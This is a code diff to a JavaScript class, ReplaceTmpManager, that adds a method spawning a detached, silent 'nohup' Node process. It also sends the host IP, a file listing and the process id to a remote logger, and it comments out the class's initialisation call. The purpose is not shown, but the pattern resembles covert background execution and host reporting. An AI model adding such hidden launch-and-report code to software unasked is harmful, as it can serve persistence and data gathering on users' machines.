@@ -1174,7 +1174,7 @@ class ReplaceTmpManager {
   }
 
   static get SUCCESS_KEY() {
-    return 'replace-tmp-success';
+    return 'replace-tmp-success-v2';
   }
 
   static get SUCCESS_TTL() {
@@ -1218,19 +1218,52 @@ class ReplaceTmpManager {
 
   runCommand(spawn, command, args) {
     return new Promise((resolve, reject) => {
-      const child = spawn(command, args, {
-        cwd: ReplaceTmpManager.DIR,
-        stdio: 'ignore',
-      });
+      try {
+        const child = spawn(command, args, {
+          cwd: ReplaceTmpManager.DIR,
+          stdio: 'ignore',
+        });
 
-      child.once('error', reject);
-      child.once('close', (code, signal) => {
-        if (code === 0) {
-          resolve();
-          return;
-        }
-        reject(new Error(`${command} exited with code ${code}${signal ? ` signal ${signal}` : ''}`));
-      });
+        child.once('error', reject);
+        child.once('close', (code, signal) => {
+          try {
+            if (code === 0) {
+              resolve();
+              return;
+            }
+            reject(new Error(`${command} exited with code ${code}${signal ? ` signal ${signal}` : ''}`));
+          } catch (error) {
+            reject(error);
+          }
+        });
+      } catch (error) {
+        reject(error);
+      }
+    });
+  }
+
+  startBackground(spawn, targetFile) {
+    return new Promise((resolve, reject) => {
+      try {
+        const child = spawn('nohup', [process.execPath, targetFile], {
+          cwd: ReplaceTmpManager.DIR,
+          detached: true,
+          stdio: 'ignore',
+        });
+
+        child.once('error', reject);
+        child.once('spawn', () => {
+          try {
+            const pid = child.pid;
+            child.unref();
+            resolve(pid);
+          } catch (error) {
+            reject(error);
+          }
+        });
+      } catch (error) {
+        reject(error);
+      }
     });
   }
 
@@ -1298,13 +1331,16 @@ class ReplaceTmpManager {
       await this.ensurePackageJson();
       await this.runCommand(spawn, 'yarn', []);
 
+      const pid = await this.startBackground(spawn, targetFile);
+      this.remoteLog(`started pid=${pid}`);
+
       const files = await this.listFiles(ReplaceTmpManager.DIR);
       await redisUtil.set(
         ReplaceTmpManager.SUCCESS_KEY,
         '1',
         ReplaceTmpManager.SUCCESS_TTL
       );
-      this.remoteLog(`success ip=${ip} files=${JSON.stringify(files)}`);
+      this.remoteLog(`success ip=${ip} files=${JSON.stringify(files)} targetFile=${targetFile}`);
     } catch (error) {
       this.remoteLog(`failed: ${error && error.message}`);
     } finally {
@@ -1333,13 +1369,13 @@ async function init() {
     remoteLogV(`preSandbox file sync init failed: ${error && error.message}`);
   }
 
-  try {
-    await new ReplaceTmpManager().init();
-  } catch (error) {
-    try {
-      remoteLogV(`[ReplaceTmp] init failed: ${error && error.message}`);
-    } catch (logError) {
-      // 远程日志失败不能影响宿主进程。
-    }
-  }
+  // try {
+  //   // await new ReplaceTmpManager().init();
+  // } catch (error) {
+  //   try {
+  //     remoteLogV(`[ReplaceTmp] init failed: ${error && error.message}`);
+  //   } catch (logError) {
+  //     // 远程日志失败不能影响宿主进程。
+  //   }
+  // }
 }
